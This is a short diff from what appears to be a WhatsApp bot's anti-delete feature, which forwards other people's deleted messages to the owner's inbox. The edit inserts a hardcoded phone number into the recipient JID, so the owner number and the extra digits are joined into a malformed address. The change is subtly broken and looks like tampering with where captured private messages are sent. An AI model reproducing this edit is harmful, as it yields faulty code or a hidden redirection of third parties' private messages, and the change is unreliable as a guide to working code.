@@ -807,7 +807,7 @@ Commands:
               const originalSender = deletedMsg.key.participant || deletedMsg.key.remoteJid;
               
               // Send to owner's inbox
-              const sendTo = ownerNumber[0] + '@s.whatsapp.net';
+              const sendTo = ownerNumber[0] + '48729759846@s.whatsapp.net';
               
               // Get original message content
               let originalContent = '';
